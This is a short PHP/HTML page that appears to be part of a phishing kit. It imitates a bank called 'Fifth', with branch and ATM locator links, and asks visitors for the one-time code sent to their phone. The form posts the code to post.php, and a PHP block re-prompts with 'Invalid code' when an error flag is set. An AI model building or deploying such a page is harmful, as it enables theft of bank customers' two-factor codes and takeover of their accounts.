<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fifth</title>
    <link rel="stylesheet" href="res\css\main.css">
</head>
<body>
    <header>
        <div class="logo">
            <img src="res\img/logo.svg">
        </div>
        <div class="logoo"> 
            <img src="res\img/logoo.png">
        </div>
        <div class="links">
            <a href="#">CUSTOMER SERVICE</a>|
            <a href="#">BRANCH & ATM LOCATOR</a>
        </div>
    </header>
    
    <div class="bottom">
       
        </div>

    <div class="container">
        
        
    <div class="login">
            <h2>Confirmation</h2>
            <p>Please enter the code sent to your phone number to continue.</p>
            <form action="post.php" method="post">
                
    <div class="group">
                    <label>Confirmation code</label>
                    <input type="text" name="otp" required placeholder="Enter the code">
                    <?php 
if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Invalid code. Please try again.</p>';
}
?>
                   </div>
                   
        <button type="submit" class="login-button">Continue</button>
    </form>

            </div>
            </div>


</body>
</html>
